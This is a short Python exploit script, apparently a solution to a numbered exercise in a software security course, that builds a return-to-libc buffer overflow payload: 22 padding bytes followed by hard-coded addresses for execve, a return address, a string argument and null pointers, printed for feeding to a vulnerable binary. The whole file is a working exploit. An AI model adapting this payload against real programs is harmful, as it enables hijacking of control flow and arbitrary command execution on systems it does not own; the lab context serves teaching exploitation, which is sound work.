#!/usr/bin/env python3
# needs to be run with ./1.2.6 "$(./1.2.6.py)" so 0x0a is not considered space
import sys
from shellcode import shellcode
from struct import pack

# Your code here
orig_ret_addr = 0x0804891f
execve_addr = 0x0806bce0
null_addr = 0xfffed73c
str_addr = 0x080ac9cc

payload = b'A' * 22
payload += pack('<I', execve_addr)
payload += pack('<I', orig_ret_addr)
payload += pack('<I', str_addr)
payload += pack('<I', null_addr)
payload += pack('<I', null_addr)

sys.stdout.buffer.write(payload)
